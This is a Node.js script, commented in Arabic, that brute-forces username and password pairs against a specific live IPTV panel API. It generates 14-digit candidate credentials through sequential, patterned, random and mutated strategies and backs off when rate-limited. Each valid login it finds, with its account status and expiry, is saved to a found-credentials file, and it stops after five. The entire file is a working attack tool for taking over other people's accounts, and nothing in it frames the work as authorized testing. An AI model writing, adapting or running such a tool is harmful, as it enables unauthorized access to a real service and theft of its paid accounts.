const fs = require('fs');
const path = require('path');

// تكوينات البحث الشاملة
const CONFIG = {
    baseUrl: 'http://orien.live/player_api.php',
    maxTimeMinutes: 10,
    digitLength: 14,
    // استراتيجيات البحث المختلفة
    strategies: {
        sequential: true,      // البحث التسلسلي
        pattern_based: true,   // البحث بالأنماط
        smart_random: true,    // عشوائي ذكي
        brute_force: true      // القوة الغاشمة المنظمة
    },
    // نطاقات الأرقام المحتملة
    ranges: {
        minStart: '10000000000000',  // 14 رقم تبدأ بـ 1
        maxStart: '99999999999999',  // 14 رقم كحد أقصى
        commonPrefixes: [
            '1630', '1631', '1632', '1633', '1634', '1635', '1636', '1637', '1638', '1639',
            '1640', '1641', '1642', '1643', '1644', '1645', '1646', '1647', '1648', '1649',
            '1650', '1651', '1652', '1653', '1654', '1655', '1656', '1657', '1658', '1659',
            '1660', '1661', '1662', '1663', '1664', '1665', '1666', '1667', '1668', '1669',
            '1670', '1671', '1672', '1673', '1674', '1675', '1676', '1677', '1678', '1679',
            '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019',
            '2020', '2021', '2022', '2023', '2024', '2025', '2026'
        ]
    }
};

// مولد الأرقام الشامل
class ComprehensiveNumberGenerator {
    constructor() {
        this.generatedNumbers = new Set();
        this.currentStrategy = 'sequential';
        this.strategyIndex = 0;
        this.lastSuccessPattern = null;
        this.strategies = ['sequential', 'pattern_based', 'smart_random', 'brute_force'];
        this.sequentialCounter = BigInt(CONFIG.ranges.minStart);
        this.maxSequential = BigInt(CONFIG.ranges.maxStart);
        this.attemptsInStrategy = 0;
        this.maxAttemptsPerStrategy = 1000; // تغيير الاستراتيجية كل 1000 محاولة
    }

    // توليد الرقم التالي
    generateNextNumber() {
        let number;
        let attempts = 0;
        
        // تغيير الاستراتيجية إذا لزم الأمر
        if (this.attemptsInStrategy >= this.maxAttemptsPerStrategy) {
            this.switchStrategy();
        }
        
        do {
            switch (this.currentStrategy) {
                case 'sequential':
                    number = this.generateSequential();
                    break;
                case 'pattern_based':
                    number = this.generatePatternBased();
                    break;
                case 'smart_random':
                    number = this.generateSmartRandom();
                    break;
                case 'brute_force':
                    number = this.generateBruteForce();
                    break;
                default:
                    number = this.generateSmartRandom();
            }
            attempts++;
        } while (this.generatedNumbers.has(number) && attempts < 20);
        
        this.generatedNumbers.add(number);
        this.attemptsInStrategy++;
        return number;
    }

    // التوليد التسلسلي - يبدأ من رقم ويتقدم
    generateSequential() {
        const numStr = this.sequentialCounter.toString().padStart(14, '0');
        this.sequentialCounter += BigInt(1);
        
        // إذا وصلنا للحد الأقصى، نعود للبداية
        if (this.sequentialCounter > this.maxSequential) {
            this.sequentialCounter = BigInt(CONFIG.ranges.minStart);
        }
        
        return numStr;
    }

    // التوليد بالأنماط
    generatePatternBased() {
        const prefix = CONFIG.ranges.commonPrefixes[
            Math.floor(Math.random() * CONFIG.ranges.commonPrefixes.length)
        ];
        
        // توليد باقي الأرقام بشكل منظم
        const remainingLength = 14 - prefix.length;
        let suffix = '';
        
        // استخدام أنماط متكررة
        const patterns = [
            '0000000000', '1111111111', '2222222222', '3333333333', '4444444444',
            '5555555555', '6666666666', '7777777777', '8888888888', '9999999999',
            '0123456789', '9876543210', '1122334455', '5544332211', '1234512345',
            '5432154321', '0000111122', '1111222233', '2222333344', '3333444455'
        ];
        
        if (Math.random() < 0.3) {
            // استخدام نمط متكرر
            suffix = patterns[Math.floor(Math.random() * patterns.length)]
                .slice(0, remainingLength);
        } else {
            // توليد عشوائي منظم
            suffix = this.generateOrganizedDigits(remainingLength);
        }
        
        return prefix + suffix;
    }

    // توليد أرقام منظمة
    generateOrganizedDigits(length) {
        let result = '';
        let lastDigit = -1;
        
        for (let i = 0; i < length; i++) {
            let digit;
            if (i > 0 && Math.random() < 0.3) {
                // تكرار الرقم السابق
                digit = lastDigit;
            } else {
                // توليد رقم جديد مع تفضيل بعض الأرقام
                const weights = [0.15, 0.15, 0.15, 0.15, 0.15, 0.15, 0.1, 0.1, 0.1, 0.1];
                digit = this.weightedRandom(weights);
            }
            result += digit;
            lastDigit = digit;
        }
        
        return result;
    }

    // توليد عشوائي ذكي
    generateSmartRandom() {
        if (this.lastSuccessPattern && Math.random() < 0.5) {
            return this.mutatePattern(this.lastSuccessPattern);
        }
        
        let number = '';
        const firstDigit = Math.random() < 0.5 ? '1' : '2';
        number += firstDigit;
        
        for (let i = 1; i < 14; i++) {
            if (i % 4 === 0 && Math.random() < 0.3) {
                // إضافة أصفار في مواقع معينة
                number += '0';
            } else {
                number += Math.floor(Math.random() * 10);
            }
        }
        
        return number;
    }

    // القوة الغاشمة المنظمة
    generateBruteForce() {
        // توليد كل الاحتمالات الممكنة ضمن نطاق معين
        const baseNumber = this.sequentialCounter.toString().padStart(14, '0');
        this.sequentialCounter += BigInt(7); // تخطي بعض الأرقام للتغطية الأوسع
        
        // تعديل بعض الأرقام
        const numArray = baseNumber.split('');
        for (let i = 0; i < 3; i++) {
            const pos = Math.floor(Math.random() * 14);
            numArray[pos] = Math.floor(Math.random() * 10).toString();
        }
        
        return numArray.join('');
    }

    // تعديل النمط الناجح
    mutatePattern(pattern) {
        const numArray = pattern.split('');
        const mutations = Math.floor(Math.random() * 4) + 1;
        
        for (let i = 0; i < mutations; i++) {
            const pos = Math.floor(Math.random() * 14);
            if (Math.random() < 0.5) {
                // تغيير بسيط
                numArray[pos] = (parseInt(numArray[pos]) + 1) % 10;
            } else {
                // تغيير كامل
                numArray[pos] = Math.floor(Math.random() * 10).toString();
            }
        }
        
        return numArray.join('');
    }

    // اختيار مرجح
    weightedRandom(weights) {
        const total = weights.reduce((a, b) => a + b, 0);
        let random = Math.random() * total;
        
        for (let i = 0; i < weights.length; i++) {
            random -= weights[i];
            if (random <= 0) return i;
        }
        
        return Math.floor(Math.random() * 10);
    }

    // تبديل الاستراتيجية
    switchStrategy() {
        this.strategyIndex = (this.strategyIndex + 1) % this.strategies.length;
        this.currentStrategy = this.strategies[this.strategyIndex];
        this.attemptsInStrategy = 0;
        console.log(`🔄 تبديل الاستراتيجية إلى: ${this.currentStrategy}`);
    }

    // تسجيل نجاح
    recordSuccess(pattern) {
        this.lastSuccessPattern = pattern;
        this.attemptsInStrategy = 0;
    }
}

// فحص تسجيل الدخول
async function tryLogin(username, password) {
    const url = `${CONFIG.baseUrl}?username=${username}&password=${password}`;
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000);
        
        const response = await fetch(url, {
            signal: controller.signal,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json'
            }
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            if (response.status === 429) {
                return { success: false, rateLimited: true };
            }
            return { success: false };
        }
        
        const data = await response.json();
        
        if (data.user_info && data.user_info.auth === 1) {
            return {
                success: true,
                data: data,
                username: username,
                password: password
            };
        }
        
        return { success: false };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// حفظ النتائج
function saveResults(results) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `found-credentials-${timestamp}.json`;
    const filepath = path.join(process.cwd(), filename);
    
    fs.writeFileSync(filepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ النتائج في: ${filename}`);
    
    const stableFilepath = path.join(process.cwd(), 'found-credentials.json');
    fs.writeFileSync(stableFilepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ نسخة في: found-credentials.json`);
}

// تحميل النتائج السابقة
function loadPreviousResults() {
    try {
        const filepath = path.join(process.cwd(), 'found-credentials.json');
        if (fs.existsSync(filepath)) {
            const data = JSON.parse(fs.readFileSync(filepath, 'utf8'));
            return Array.isArray(data) ? data : [];
        }
    } catch (error) {
        console.log('⚠️ لا توجد نتائج سابقة');
    }
    return [];
}

// الدالة الرئيسية
async function main() {
    console.log('🚀 بدء البحث الشامل عن بيانات اعتماد صالحة...');
    console.log(`⏱️  الحد الأقصى للوقت: ${CONFIG.maxTimeMinutes} دقائق`);
    console.log(`🔢 طول الأرقام: ${CONFIG.digitLength} رقم`);
    console.log(`📊 الاستراتيجيات: ${Object.keys(CONFIG.strategies).filter(k => CONFIG.strategies[k]).join(', ')}\n`);
    
    const generator = new ComprehensiveNumberGenerator();
    const startTime = Date.now();
    const maxTimeMs = CONFIG.maxTimeMinutes * 60 * 1000;
    
    let attempts = 0;
    let successfulLogins = loadPreviousResults();
    let rateLimitCount = 0;
    let consecutiveTimeouts = 0;
    
    // تحميل الأرقام المجربة سابقاً
    try {
        const progressFile = path.join(process.cwd(), 'progress.json');
        if (fs.existsSync(progressFile)) {
            const progress = JSON.parse(fs.readFileSync(progressFile, 'utf8'));
            progress.triedNumbers.forEach(num => generator.generatedNumbers.add(num));
            console.log(`📥 تم تحميل ${progress.triedNumbers.length} رقم مجرب سابقاً`);
        }
    } catch (error) {
        // تجاهل أخطاء التحميل
    }
    
    while (Date.now() - startTime < maxTimeMs) {
        attempts++;
        
        // توليد زوج من الأرقام
        const username = generator.generateNextNumber();
        const password = generator.generateNextNumber();
        
        // عرض التقدم
        if (attempts % 10 === 0 || attempts === 1) {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            console.log(`\n🔍 المحاولة #${attempts} | ⏱️ ${elapsed}ث | 📊 ${generator.currentStrategy}`);
            console.log(`   Username: ${username}`);
            console.log(`   Password: ${password}`);
        }
        
        // محاولة تسجيل الدخول
        const result = await tryLogin(username, password);
        
        if (result.success) {
            console.log('\n✅✅✅ تم العثور على بيانات اعتماد صالحة! ✅✅✅');
            console.log(`   👤 Username: ${username}`);
            console.log(`   🔑 Password: ${password}`);
            console.log(`   📊 Status: ${result.data.user_info.status}`);
            console.log(`   📅 Expiration: ${new Date(parseInt(result.data.user_info.exp_date) * 1000).toLocaleDateString()}\n`);
            
            successfulLogins.push({
                username: username,
                password: password,
                user_info: result.data.user_info,
                server_info: result.data.server_info,
                found_at: new Date().toISOString(),
                attempts: attempts
            });
            
            generator.recordSuccess(username);
            
            // حفظ النتائج فوراً
            saveResults(successfulLogins);
            
            // حفظ التقدم
            const progress = {
                lastAttempt: attempts,
                timestamp: new Date().toISOString(),
                triedNumbers: Array.from(generator.generatedNumbers).slice(-1000)
            };
            fs.writeFileSync(path.join(process.cwd(), 'progress.json'), JSON.stringify(progress));
            
            // إذا وجدنا 5 حسابات ناجحة، نتوقف
            if (successfulLogins.length >= 5) {
                console.log('🎉🎉🎉 تم العثور على 5 حسابات ناجحة! إنهاء البحث.');
                break;
            }
        } else if (result.rateLimited) {
            rateLimitCount++;
            console.log(`⚠️ تم تقييد المعدل (429). الانتظار...`);
            await new Promise(resolve => setTimeout(resolve, 10000));
            consecutiveTimeouts = 0;
        } else if (result.error) {
            consecutiveTimeouts++;
            console.log(`⏱️ خطأ: ${result.error}`);
            if (consecutiveTimeouts >= 5) {
                console.log('🔄 كثرة الأخطاء، تغيير الاستراتيجية...');
                generator.switchStrategy();
                consecutiveTimeouts = 0;
            }
        } else {
            console.log(`❌ فشل (auth=0)`);
            consecutiveTimeouts = 0;
        }
        
        // تأخير ديناميكي
        let delay = 50; // تأخير أساسي صغير
        if (rateLimitCount > 0) {
            delay = 5000; // تأخير أكبر عند تقييد المعدل
        } else if (attempts % 100 === 0) {
            delay = 1000; // تأخير دوري
        }
        
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // حفظ التقدم كل 500 محاولة
        if (attempts % 500 === 0) {
            const progress = {
                lastAttempt: attempts,
                timestamp: new Date().toISOString(),
                triedNumbers: Array.from(generator.generatedNumbers).slice(-10000)
            };
            fs.writeFileSync(path.join(process.cwd(), 'progress.json'), JSON.stringify(progress));
            console.log(`💾 تم حفظ التقدم في المحاولة ${attempts}`);
        }
    }
    
    // النتائج النهائية
    console.log('\n📊 ======== ملخص البحث ========');
    console.log(`   ⏱️  الوقت المستغرق: ${Math.floor((Date.now() - startTime) / 1000)} ثانية`);
    console.log(`   🔢 إجمالي المحاولات: ${attempts}`);
    console.log(`   ✅ الحسابات الناجحة: ${successfulLogins.length}`);
    
    if (successfulLogins.length > 0) {
        console.log('\n🎯 الحسابات المكتشفة:');
        successfulLogins.forEach((login, index) => {
            console.log(`\n   ${index + 1}. 👤 Username: ${login.username}`);
            console.log(`      🔑 Password: ${login.password}`);
            console.log(`      📊 Status: ${login.user_info.status}`);
            console.log(`      📅 Expires: ${new Date(parseInt(login.user_info.exp_date) * 1000).toLocaleDateString()}`);
            console.log(`      🔢 Found at attempt: ${login.attempts}`);
        });
    } else {
        console.log('\n❌ لم يتم العثور على حسابات صالحة في هذه الدورة.');
    }
    
    // حفظ النتائج النهائية
    if (successfulLogins.length > 0) {
        saveResults(successfulLogins);
    }
    
    // حفظ التقدم النهائي
    const finalProgress = {
        lastAttempt: attempts,
        timestamp: new Date().toISOString(),
        totalAttempts: attempts,
        triedNumbers: Array.from(generator.generatedNumbers).slice(-10000)
    };
    fs.writeFileSync(path.join(process.cwd(), 'progress.json'), JSON.stringify(finalProgress));
    
    console.log('\n🏁 انتهى البحث.');
    process.exit(0);
}

// تشغيل البرنامج
main().catch(error => {
    console.error('❌ خطأ غير متوقع:', error);
    process.exit(1);
});
